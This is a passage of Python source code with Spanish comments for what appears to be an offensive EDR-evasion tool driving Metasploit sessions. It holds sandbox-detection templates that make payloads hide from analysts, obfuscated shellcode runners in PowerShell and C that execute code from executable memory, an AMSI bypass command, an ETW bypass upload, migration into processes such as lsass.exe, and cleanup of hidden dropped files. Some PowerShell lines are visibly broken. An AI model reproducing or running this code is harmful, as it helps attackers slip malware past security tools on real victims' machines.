                        "pestudio", "regshot", "autoruns", "autorunsc", "filemon",
                        "procmon", "idaq", "idaq64", "ImmunityDebugger", "dumpcap",
                        "HookExplorer", "ImportREC", "PETools", "LordPE", "SysInspector",
                        "proc_analyzer", "sysAnalyzer", "sniff_hit", "windbg", "joeboxcontrol"
                    )
                    
                    foreach ($process in Get-Process | Select-Object -ExpandProperty ProcessName) {
                        if ($suspiciousProcesses -contains $process.ToLower()) {
                            $isSandbox = $true
                            break
                        }
                    }
                    
                    return $isSandbox
                }
                
                # Agregar lógica para ejecutar sólo si no estamos en sandbox
                if (-not (Test-Sandbox)) {
                
                ''',
                
                "c": '''
                #include <windows.h>
                #include <stdio.h>
                #include <sysinfoapi.h>
                
                // Función para detectar entornos sandbox
                BOOL IsSandbox() {
                    BOOL isSandbox = FALSE;
                    
                    // 1. Verificar memoria total (las sandbox suelen tener poca RAM)
                    MEMORYSTATUSEX memInfo;
                    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
                    GlobalMemoryStatusEx(&memInfo);
                    
                    if (memInfo.ullTotalPhys < 4ULL * 1024ULL * 1024ULL * 1024ULL) { // Menos de 4GB RAM
                        isSandbox = TRUE;
                    }
                    
                    // 2. Verificar número de procesadores
                    SYSTEM_INFO sysInfo;
                    GetSystemInfo(&sysInfo);
                    
                    if (sysInfo.dwNumberOfProcessors < 2) {
                        isSandbox = TRUE;
                    }
                    
                    // 3. Comprobar tiempo de arranque
                    ULONGLONG uptime = GetTickCount64() / 1000; // Uptime en segundos
                    if (uptime < 30 * 60) { // Menos de 30 minutos
                        isSandbox = TRUE;
                    }
                    
                    // 4. Buscar procesos sospechosos
                    const char* suspiciousProcesses[] = {
                        "wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe",
                        "pestudio.exe", "regshot.exe", "autoruns.exe", "autorunsc.exe",
                        "filemon.exe", "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe",
                        "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe",
                        "LordPE.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe",
                        "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", NULL
                    };
                    
                    HANDLE hProcessSnap;
                    PROCESSENTRY32 pe32;
                    
                    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                    if (hProcessSnap != INVALID_HANDLE_VALUE) {
                        pe32.dwSize = sizeof(PROCESSENTRY32);
                        if (Process32First(hProcessSnap, &pe32)) {
                            do {
                                for (int i = 0; suspiciousProcesses[i] != NULL; i++) {
                                    if (_stricmp(pe32.szExeFile, suspiciousProcesses[i]) == 0) {
                                        isSandbox = TRUE;
                                        break;
                                    }
                                }
                                if (isSandbox) break;
                            } while (Process32Next(hProcessSnap, &pe32));
                        }
                        CloseHandle(hProcessSnap);
                    }
                    
                    // 5. Verificar rutas típicas de sandbox
                    const char* suspiciousPaths[] = {
                        "C:\\\\analysis", "C:\\\\sandbox", "C:\\\\virus", "C:\\\\sample",
                        "D:\\\\analysis", "D:\\\\sandbox", "D:\\\\virus", "D:\\\\sample",
                        NULL
                    };
                    
                    char systemPath[MAX_PATH];
                    GetSystemDirectoryA(systemPath, MAX_PATH);
                    
                    for (int i = 0; suspiciousPaths[i] != NULL; i++) {
                        if (strstr(systemPath, suspiciousPaths[i]) != NULL) {
                            isSandbox = TRUE;
                            break;
                        }
                    }
                    
                    return isSandbox;
                }
                
                // Código principal que comprueba sandbox antes de ejecutar
                int main() {
                    if (IsSandbox()) {
                        // Si estamos en sandbox, salir o hacer algo inocuo
                        printf("System check failed, exiting.\\n");
                        return 0;
                    }
                    
                    // Si no estamos en sandbox, continuar con el código principal
                '''
            },
            "linux": {
                "bash": '''
                #!/bin/bash
                # Técnicas de detección de sandbox en Linux
                
                # Función para detectar entornos sandbox
                detect_sandbox() {
                    local is_sandbox=0
                    
                    # 1. Comprobar memoria total
                    local mem_total=$(grep MemTotal /proc/meminfo | awk '{print $2}')
                    if [ $mem_total -lt 4000000 ]; then  # Menos de 4GB RAM
                        is_sandbox=1
                    fi
                    
                    # 2. Comprobar número de CPU
                    local cpu_count=$(grep -c processor /proc/cpuinfo)
                    if [ $cpu_count -lt 2 ]; then
                        is_sandbox=1
                    fi
                    
                    # 3. Comprobar tiempo de actividad
                    local uptime=$(cat /proc/uptime | awk '{print $1}')
                    if (( $(echo "$uptime < 1800" | bc -l) )); then  # Menos de 30 minutos
                        is_sandbox=1
                    fi
                    
                    # 4. Comprobar procesos típicos de análisis
                    for proc in tcpdump wireshark ltrace strace gdb valgrind; do
                        if pgrep -x "$proc" > /dev/null; then
                            is_sandbox=1
                            break
                        fi
                    done
                    
                    # 5. Comprobar rutas típicas de sandbox
                    for path in /sandbox /analysis /malware; do
                        if [ -d "$path" ]; then
                            is_sandbox=1
                            break
                        fi
                    done
                    
                    # 6. Comprobar nombres de usuario sospechosos
                    local current_user=$(whoami)
                    for user in sandbox analyst malware maltest virus; do
                        if [ "$current_user" = "$user" ]; then
                            is_sandbox=1
                            break
                        fi
                    done
                    
                    # 7. Verificar QEMU/VirtualBox/VMWare
                    if [ -e /proc/scsi/scsi ] && grep -i -E "QEMU|VBOX|VMWARE" /proc/scsi/scsi; then
                        is_sandbox=1
                    fi
                    
                    return $is_sandbox
                }
                
                # Ejecutar sólo si no estamos en sandbox
                if detect_sandbox; then
                    echo "Entorno de análisis detectado. Saliendo."
                    exit 0
                fi
                
                # Continuar con el script principal si no estamos en un sandbox
                '''
            }
        }
        
        if platform not in sandbox_detection_code:
            platform = "windows"
        
        platform_code = sandbox_detection_code[platform]
        
        # Seleccionar el código de detección adecuado según el lenguaje
        if "powershell" in code.lower() or ".ps1" in code.lower():
            detection_code = platform_code.get("powershell", "")
            # Añadir el cierre del bloque if
            return detection_code + code + "\n}"
        elif "#include" in code:
            detection_code = platform_code.get("c", "")
            # Añadir el código después de return 0; o return EXIT_SUCCESS;
            main_end = code.rfind("return 0;")
            if main_end == -1:
                main_end = code.rfind("return EXIT_SUCCESS;")
            
            if main_end != -1:
                # Encontrar el final de la función main
                closing_brace = code.find("}", main_end)
                if closing_brace != -1:
                    return detection_code + code[closing_brace:]
                else:
                    return detection_code + code
            else:
                return detection_code + code
        elif "bash" in code or "#!/bin" in code:
            detection_code = platform_code.get("bash", "")
            return detection_code + code
        else:
            # Por defecto, devolver el código sin modificar
            return code
    
    def generate_shellcode_runner(self, shellcode_type="meterpreter", platform="windows"):
        """Genera código para ejecutar shellcode con técnicas de evasión"""
        shellcode_runners = {
            "windows": {
                "powershell": '''
                # PowerShell Shellcode Runner con técnicas de evasión
                
                # Técnica 1: Suspensión antes de la ejecución
                Start-Sleep -Seconds $(Get-Random -Minimum 3 -Maximum 8)
                
                # Técnica 2: Detectar entorno de análisis
                function Test-Analysis {
                    $isAnalysis = $false
                    
                    # Comprobar memoria
                    $memory = Get-WmiObject -Class Win32_ComputerSystem
                    if ($memory.TotalPhysicalMemory -lt 3GB) {
                        $isAnalysis = $true
                    }
                    
                    # Comprobar nombre de usuario
                    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                    $suspiciousUsers = @("admin", "maltest", "sandbox", "virus", "malware")
                    foreach ($user in $suspiciousUsers) {
                        if ($currentUser -like "*$user*") {
                            $isAnalysis = $true
                            break
                        }
                    }
                    
                    return $isAnalysis
                }
                
                if (Test-Analysis) {
                    Write-Host "Verificación del sistema fallida. Saliendo."
                    exit
                }
                
                # Técnica 3: Variables ofuscadas
                $wTXXw = "System.Runtime.InteropServices.Marshal"
                $uiTVgxm = [Reflection.Assembly]::LoadWithPartialName($wTXXw)
                $KzZetcQwP = [Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
                $FZlPY = New-Object System.Runtime.InteropServices.DllImportAttribute("kernel32.dll")
                $FZlPY.EntryPoint = "VirtualAlloc"
                $FZlPY.SetLastError = $true
                $FZlPY.CallingConvention = [System.Runtime.InteropServices.CallingConvention]::WinApi
                $FZlPY.ExactSpelling = $true
                
                $TdoR = New-Object IntPtr
                $NrRDrIxHw = [System.Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32])
                $XlTUzCR = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((New-Object System.IntPtr(0x7ffe0308)), (New-Object System.Type[](0)))
                $YeAgr = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
                
                # Shellcode placeholder (será reemplazado por el código real)
                $wqvFbdTXgA = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31)
                
                # Técnica 4: Proceso de conversión ofuscado
                $LnghtIwcQiE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((New-Object System.IntPtr(0x7ffe0308)), (New-Object System.Type[](0)))
                $ZTZMT = [Byte[]] $(for ($i = 0; $i -lt $wqvFbdTXgA.Count; $i++) { $wqvFbdTXgA[$i] })
                
                # Técnica 5: Reservar memoria y escribir shellcode
                $kLKjxq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((New-Object System.IntPtr(0x7ffe0308)), (New-Object System.Type[](0)))
                $cFHD = New-Object "System.Security.AccessControl.DirectorySecurity"
                
                $Win32Functions = New-Object System.Object
                $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Dll]::GetProcAddress([Dll]::LoadLibrary("kernel32.dll"), "VirtualAlloc"), (New-Object Type[](4))))
                
                $qeYRJg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Dll]::GetProcAddress([Dll]::LoadLibrary("kernel32.dll"), "VirtualAlloc"), (New-Object Type[](4)))
                $DHptc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Dll]::GetProcAddress([Dll]::LoadLibrary("kernel32.dll"), "CreateThread"), (New-Object Type[](6))))
                $JiAoHVrWPQu = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Dll]::GetProcAddress([Dll]::LoadLibrary("kernel32.dll"), "WaitForSingleObject"), (New-Object Type[](2))))
                
                $JMmR = $qeYRJg.Invoke([IntPtr]::Zero, $ZTZMT.Length, 0x3000, 0x40)
                [System.Runtime.InteropServices.Marshal]::Copy($ZTZMT, 0, $JMmR, $ZTZMT.Length)
                
                # Técnica 6: Crear hilo y ejecutar shellcode con seguimientos mínimos
                $YDkFuGSJ = $DHptc.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $JMmR, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                [void]$JiAoHVrWPQu.Invoke($YDkFuGSJ, 0xFFFFFFFF)
                ''',
                
                "c": '''
                #include <windows.h>
                #include <stdio.h>
                #include <stdlib.h>
                #include <string.h>
                #include <time.h>
                
                // Función para comprobar si estamos en un entorno de análisis
                BOOL IsAnalysisEnvironment() {
                    MEMORYSTATUSEX memInfo;
                    SYSTEM_INFO sysInfo;
                    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
                    DWORD size = sizeof(computerName);
                    BOOL isAnalysis = FALSE;
                    
                    // Comprobar memoria total
                    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
                    GlobalMemoryStatusEx(&memInfo);
                    if (memInfo.ullTotalPhys < 3ULL * 1024ULL * 1024ULL * 1024ULL) { // Menos de 3GB
                        isAnalysis = TRUE;
                    }
                    
                    // Comprobar número de procesadores
                    GetSystemInfo(&sysInfo);
                    if (sysInfo.dwNumberOfProcessors < 2) {
                        isAnalysis = TRUE;
                    }
                    
                    // Comprobar nombre del equipo
                    GetComputerNameA(computerName, &size);
                    const char* suspiciousNames[] = {"SANDBOX", "VIRUS", "MALWARE", "ANALYSIS"};
                    
                    for (int i = 0; i < 4; i++) {
                        if (strstr(strupr(computerName), suspiciousNames[i]) != NULL) {
                            isAnalysis = TRUE;
                            break;
                        }
                    }
                    
                    return isAnalysis;
                }
                
                // Función para introducir retrasos aleatorios
                void RandomSleep() {
                    srand(time(NULL));
                    Sleep((rand() % 5000) + 1000); // 1-6 segundos
                }
                
                // Función para generar nombres aleatorios
                void RandomName(char* buffer, size_t length) {
                    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    
                    for (size_t i = 0; i < length - 1; i++) {
                        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
                    }
                    
                    buffer[length - 1] = '\\0';
                }
                
                int main() {
                    // Comprobar si estamos en un entorno de análisis
                    if (IsAnalysisEnvironment()) {
                        // Salir silenciosamente
                        return 0;
                    }
                    
                    // Introducir retraso aleatorio
                    RandomSleep();
                    
                    // Shellcode de ejemplo (será reemplazado en tiempo de ejecución)
                    unsigned char shellcode[] = {
                        0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2
                    };
                    
                    // Reservar memoria para el shellcode con nombres aleatorios
                    char funcName1[20], funcName2[20], funcName3[20];
                    RandomName(funcName1, sizeof(funcName1));
                    RandomName(funcName2, sizeof(funcName2));
                    RandomName(funcName3, sizeof(funcName3));
                    
                    // Usar punteros a función con nombres aleatorios para ofuscar las llamadas API
                    LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
                    HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = CreateThread;
                    DWORD (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds) = WaitForSingleObject;
                    
                    // Ejecutar shellcode
                    LPVOID lpvAddr = pVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    memcpy(lpvAddr, shellcode, sizeof(shellcode));
                    
                    // Introducir otro retraso aleatorio
                    RandomSleep();
                    
                    // Crear hilo y ejecutar shellcode
                    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvAddr, NULL, 0, NULL);
                    pWaitForSingleObject(hThread, INFINITE);
                    
                    return 0;
                }
                '''
            },
            "linux": {
                "c": '''
                #include <stdio.h>
                #include <stdlib.h>
                #include <string.h>
                #include <unistd.h>
                #include <sys/mman.h>
                #include <time.h>
                
                // Función para comprobar si estamos en un entorno de análisis
                int isAnalysisEnvironment() {
                    int result = 0;
                    FILE *fp;
                    char buffer[1024];
                    
                    // Comprobar memoria
                    fp = popen("grep MemTotal /proc/meminfo | awk '{print $2}'", "r");
                    if (fp) {
                        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
                            long memTotal = atol(buffer);
                            if (memTotal < 3000000) { // Menos de 3GB
                                result = 1;
                            }
                        }
                        pclose(fp);
                    }
                    
                    // Comprobar número de CPU
                    fp = popen("grep -c processor /proc/cpuinfo", "r");
                    if (fp) {
                        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
                            int cpuCount = atoi(buffer);
                            if (cpuCount < 2) {
                                result = 1;
                            }
                        }
                        pclose(fp);
                    }
                    
                    // Comprobar herramientas de análisis
                    if (access("/usr/bin/strace", F_OK) != -1 && 
                        access("/usr/bin/ltrace", F_OK) != -1 && 
                        access("/usr/bin/gdb", F_OK) != -1) {
                        result = 1;
                    }
                    
                    return result;
                }
                
                // Función para introducir retrasos aleatorios
                void randomSleep() {
                    srand(time(NULL));
                    usleep((rand() % 5000000) + 1000000); // 1-6 segundos
                }
                
                int main() {
                    // Comprobar si estamos en un entorno de análisis
                    if (isAnalysisEnvironment()) {
                        // Salir silenciosamente
                        return 0;
                    }
                    
                    // Introducir retraso aleatorio
                    randomSleep();
                    
                    // Shellcode de ejemplo (será reemplazado)
                    unsigned char shellcode[] = {
                        0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f
                    };
                    
                    // Asignar memoria ejecutable
                    void *memory = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                    
                    if (memory == MAP_FAILED) {
                        perror("mmap");
                        return 1;
                    }
                    
                    // Copiar shellcode a la memoria ejecutable
                    memcpy(memory, shellcode, sizeof(shellcode));
                    
                    // Introducir otro retraso aleatorio
                    randomSleep();
                    
                    // Ejecutar shellcode
                    int (*shellcode_func)() = (int(*)())memory;
                    shellcode_func();
                    
                    // Liberar memoria (nunca se llegará aquí si el shellcode es exitoso)
                    munmap(memory, sizeof(shellcode));
                    
                    return 0;
                }
                '''
            }
        }
        
        if platform not in shellcode_runners:
            platform = "windows"
        
        # Seleccionar el tipo de shellcode runner
        if platform == "windows":
            if shellcode_type == "meterpreter" or shellcode_type == "reverse_shell":
                return shellcode_runners[platform].get("powershell", "") if random.random() < 0.5 else shellcode_runners[platform].get("c", "")
            else:
                return shellcode_runners[platform].get("c", "")
        else:
            return shellcode_runners[platform].get("c", "")
    
    def perform_evasion_on_session(self, session_id, target_info=None, output_file=None):
        """Aplica técnicas de evasión a una sesión existente"""
        start_time = datetime.now()
        logger.info(f"Iniciando técnicas de evasión en sesión {session_id} a las {start_time.strftime('%H:%M:%S')}")
        
        if not target_info:
            target_info = {}
        
        result = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'evasion_info': {
                'duration': None,
                'techniques_used': []
            },
            'applied_techniques': [],
            'success': False,
            'message': ""
        }
        
        try:
            # Verificar si la sesión existe
            if not self.initialize_msf():
                logger.error("No se pudo inicializar Metasploit RPC")
                result['evasion_info']['error'] = "Error al inicializar Metasploit RPC"
                return result
            
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                result['evasion_info']['error'] = f"La sesión {session_id} no existe"
                return result
            
            # Obtener información del sistema
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            session_type = session_info.get('type', '')
            
            # Configurar técnicas de evasión según la plataforma
            evasion_techniques = self.config.get("evasion_techniques", [])
            applied_techniques = []
            
            # Aplicar técnicas de evasión según el tipo de sesión y plataforma
            if session_type == 'meterpreter':
                # 1. Comprobamos si necesitamos migrar
                logger.info(f"Aplicando técnicas de evasión en sesión meterpreter {session_id}")
                
                if "windows" in platform:
                    # En Windows, primero aplicamos bypass AMSI si está configurado
                    if "amsi_bypass" in evasion_techniques:
                        logger.info("Aplicando bypass AMSI")
                        
                        # Solo para sesiones PowerShell
                        ps_command = "powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
                        
                        output = self.run_command_on_session(session_id, "execute -f cmd -a '/c " + ps_command + "' -H -i")
                        
                        applied_techniques.append({
                            "name": "amsi_bypass",
                            "platform": "windows",
                            "success": True,
                            "output": "AMSI bypass aplicado"
                        })
                    
                    # Bypass ETW si está configurado
                    if "etw_bypass" in evasion_techniques:
                        logger.info("Aplicando bypass ETW")
                        
                        # Generar script de bypass ETW
                        etw_bypass_code = self.generate_etw_bypass()
                        bypass_file = f"/tmp/etw_bypass_{random.randint(1000, 9999)}.ps1"
                        
                        with open(bypass_file, 'w') as f:
                            f.write(etw_bypass_code)
                        
                        # Subir y ejecutar el script
                        remote_file = "C:\\Windows\\Temp\\etw.ps1"
                        upload_success = self.upload_file_to_session(session_id, bypass_file, remote_file)
                        
                        if upload_success:
                            # Ejecutar el script
                            ps_command = f"powershell -ExecutionPolicy Bypass -File {remote_file}"
                            output = self.run_command_on_session(session_id, "execute -f cmd -a '/c " + ps_command + "' -H -i")
                            
                            applied_techniques.append({
                                "name": "etw_bypass",
                                "platform": "windows",
                                "success": True,
                                "output": "ETW bypass aplicado"
                            })
                            
                            # Limpiar archivo
                            self.run_command_on_session(session_id, f"rm {remote_file}")
                            os.remove(bypass_file)
                    
                    # Migrar proceso si está configurado
                    if "process_migration" in evasion_techniques:
                        logger.info("Realizando migración de proceso")
                        
                        # Buscar procesos para migración y seleccionar uno adecuado
                        ps_output = self.run_command_on_session(session_id, "ps")
                        
                        target_processes = ["explorer.exe", "svchost.exe", "lsass.exe", "spoolsv.exe"]
                        target_pid = None
                        
                        for process in target_processes:
                            if process in ps_output:
                                # Extraer PID
                                for line in ps_output.splitlines():
                                    if process in line:
                                        parts = line.strip().split()
                                        if len(parts) >= 2:
                                            try:
                                                pid = int(parts[0])
                                                target_pid = pid
                                                break
                                            except ValueError:
                                                continue
                            
                            if target_pid:
                                break
                        
                        if target_pid:
                            # Realizar migración
                            migrate_output = self.run_command_on_session(session_id, f"migrate {target_pid}")
                            
                            applied_techniques.append({
                                "name": "process_migration",
                                "platform": "windows",
                                "success": "Migration completed successfully" in migrate_output,
                                "details": f"Migrado a proceso {target_pid}"
                            })
                
                elif "linux" in platform or "unix" in platform:
                    # En Linux, realizar evasiones específicas
                    if "memory_patching" in evasion_techniques:
                        logger.info("Aplicando técnicas de evasión en memoria")
                        
                        # Subir y ejecutar script de syscalls directos
                        syscall_code = self.generate_syscall_evasion(platform="linux")
                        syscall_file = f"/tmp/syscall_evasion_{random.randint(1000, 9999)}.c"
                        
                        with open(syscall_file, 'w') as f:
                            f.write(syscall_code)
                        
                        # Compilar
                        compile_output = subprocess.run(["gcc", syscall_file, "-o", syscall_file + ".bin"], 
                                                      capture_output=True, text=True)
                        
                        if compile_output.returncode == 0:
                            # Subir binario compilado
                            remote_file = "/tmp/.se"
                            upload_success = self.upload_file_to_session(session_id, syscall_file + ".bin", remote_file)
                            
                            if upload_success:
                                # Dar permisos y ejecutar
                                self.run_command_on_session(session_id, f"chmod +x {remote_file}")
                                output = self.run_command_on_session(session_id, remote_file)
                                
                                applied_techniques.append({
                                    "name": "syscall_manipulation",
                                    "platform": "linux",
                                    "success": True,
                                    "output": "Syscall evasion aplicado"
                                })
                                
                                # Limpiar
                                self.run_command_on_session(session_id, f"rm {remote_file}")
                            
                            # Limpiar archivos locales
                            os.remove(syscall_file)
                            os.remove(syscall_file + ".bin")
            
            elif session_type == 'shell':
                # Para sesiones shell, aplicar otras técnicas
                logger.info(f"Aplicando técnicas de evasión en sesión shell {session_id}")
                
                if "windows" in platform:
                    # En Windows, aplicar técnicas de ofuscación
                    if "payload_obfuscation" in evasion_techniques:
                        logger.info("Aplicando técnicas de ofuscación de payload")
                        
                        # Generar shellcode runner ofuscado
                        shellcode_runner = self.generate_shellcode_runner("meterpreter", "windows")
                        runner_file = f"/tmp/runner_{random.randint(1000, 9999)}.ps1"
                        
                        with open(runner_file, 'w') as f:
                            f.write(shellcode_runner)
                        
                        # Aplicar ofuscación adicional
                        obfuscated_code = self.apply_powershell_obfuscation(shellcode_runner)
                        with open(runner_file, 'w') as f:
                            f.write(obfuscated_code)
                        
                        # Subir a la sesión
                        remote_file = "C:\\Windows\\Temp\\r.ps1"
                        upload_success = self.upload_file_to_session(session_id, runner_file, remote_file)
                        
                        if upload_success:
                            applied_techniques.append({
                                "name": "payload_obfuscation",
                                "platform": "windows",
                                "success": True,
                                "details": "Payload ofuscado preparado"
                            })
                            
                            # Limpiar
                            os.remove(runner_file)
                
                elif "linux" in platform or "unix" in platform:
                    # En Linux, aplicar técnicas de sandbox_detection
                    if "sandbox_detection" in evasion_techniques:
                        logger.info("Aplicando técnicas de detección de sandbox")
                        
                        # Generar código de detección
                        sandbox_code = self.apply_sandbox_detection("", platform="linux")
                        sandbox_file = f"/tmp/sandbox_detect_{random.randint(1000, 9999)}.sh"
                        
                        with open(sandbox_file, 'w') as f:
                            f.write(sandbox_code)
                        
                        # Subir a la sesión
                        remote_file = "/tmp/.sd.sh"
                        upload_success = self.upload_file_to_session(session_id, sandbox_file, remote_file)
                        
                        if upload_success:
                            # Dar permisos y ejecutar
                            self.run_command_on_session(session_id, f"chmod +x {remote_file}")
                            output = self.run_command_on_session(session_id, f"bash {remote_file}")
                            
                            applied_techniques.append({
                                "name": "sandbox_detection",
                                "platform": "linux",
                                "success": True,
                                "output": "Detección de sandbox aplicada"
                            })
                            
                            # Limpiar
                            self.run_command_on_session(session_id, f"rm {remote_file}")
                            os.remove(sandbox_file)
            
            # Registrar técnicas aplicadas
            result['applied_techniques'] = applied_techniques
            result['evasion_info']['techniques_used'] = [tech["name"] for tech in applied_techniques]
            
            # Verificar éxito
            if applied_techniques:
                result['success'] = True
                result['message'] = f"Se aplicaron {len(applied_techniques)} técnicas de evasión exitosamente"
            else:
                result['message'] = "No se aplicaron técnicas de evasión"
        
        except Exception as e:
            logger.error(f"Error en aplicación de técnicas de evasión: {str(e)}")
            result['evasion_info']['error'] = f"Error: {str(e)}"
        
        # Calcular duración
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        result['evasion_info']['duration'] = duration
        logger.info(f"Aplicación de técnicas de evasión finalizada. Duración: {duration} segundos")
        
        # Guardar resultados
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Resultados guardados en {output_file}")
        
        return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Herramienta de evasión de EDR con técnicas avanzadas')
    parser.add_argument('-s', '--session', required=True, help='ID de sesión de Metasploit')
    parser.add_argument('-t', '--target', help='Información del objetivo en formato JSON')
    parser.add_argument('-o', '--output', help='Archivo de salida para resultados JSON')
    parser.add_argument('-c', '--config', default='/opt/pentest/config/evasion-config.json', 
                        help='Archivo de configuración personalizado')
    parser.add_argument('--techniques', nargs='+', 
                        choices=['amsi_bypass', 'etw_bypass', 'payload_obfuscation', 'memory_patching', 
                                'process_migration', 'sleep_obfuscation', 'syscall_manipulation', 'sandbox_detection'],
                        help='Técnicas de evasión específicas a aplicar')
    
    args = parser.parse_args()
    
    # Cargar datos del objetivo si se proporciona
    target_info = None
    if args.target:
        try:
            with open(args.target, 'r') as f:
                target_info = json.load(f)
        except Exception as e:
            logger.error(f"Error al cargar archivo del objetivo: {str(e)}")
    
    # Crear directorio de salida si no existe
    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    
    edr_evasion = EdrEvasion(args.config)
    
    # Establecer técnicas específicas si se proporcionan
    if args.techniques:
        edr_evasion.config['evasion_techniques'] = args.techniques
    
    edr_evasion.perform_evasion_on_session(args.session, target_info, args.output)                   